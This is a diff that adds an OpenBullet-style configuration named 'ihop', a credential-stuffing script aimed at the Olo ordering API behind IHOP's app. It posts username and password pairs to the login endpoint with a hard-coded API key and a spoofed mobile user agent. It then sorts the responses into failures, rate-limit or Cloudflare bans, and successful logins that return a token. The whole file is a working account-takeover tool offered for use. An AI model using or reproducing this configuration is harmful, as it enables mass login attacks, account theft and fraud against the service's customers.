@@ -1,0 +1,50 @@
+[SETTINGS]
+{
+  "Name": "ihop",
+  "SuggestedBots": 1,
+  "MaxCPM": 0,
+  "LastModified": "2019-07-25T01:22:09.1359873-04:00",
+  "AdditionalInfo": "",
+  "Author": "killerky123",
+  "Version": "1.1.3",
+  "IgnoreResponseErrors": false,
+  "MaxRedirects": 8,
+  "NeedsProxies": false,
+  "OnlySocks": false,
+  "OnlySsl": false,
+  "MaxProxyUses": 0,
+  "EncodeData": false,
+  "AllowedWordlist1": "",
+  "AllowedWordlist2": "",
+  "DataRules": [],
+  "CustomInputs": [],
+  "ForceHeadless": false,
+  "AlwaysOpen": false,
+  "AlwaysQuit": false,
+  "DisableNotifications": false,
+  "CustomUserAgent": "",
+  "RandomUA": false,
+  "CustomCMDArgs": ""
+}
+
+[SCRIPT]
+REQUEST POST "https://ordering.api.olo.com/v1.1//users/authenticate " AutoRedirect=FALSE 
+  CONTENT "{\"login\":\"<USER>\",\"password\":\"<PASS>\",\"basketid\":null}" 
+  CONTENTTYPE "application/json; charset=utf-8" 
+  HEADER "Authorization: OloKey Wy9Rq0y6ELcWhKHvdnmxKgRvxiRfQ6QU" 
+  HEADER "Host: ordering.api.olo.com" 
+  HEADER "Connection: Keep-Alive" 
+  HEADER "Accept-Encoding: gzip" 
+  HEADER "User-Agent: okhttp/3.4.1" 
+
+KEYCHECK BanOnToCheck=FALSE 
+  KEYCHAIN Failure OR 
+    KEY "Invalid email or password. Please try again" 
+  KEYCHAIN Ban OR 
+    KEY "Attention Required! | Cloudflare</" 
+    KEY "Access denied " 
+    KEY "Too many login attempts. Please " 
+    KEY "404 Not Found" 
+  KEYCHAIN Success OR 
+    KEY "token\":\"" 
+
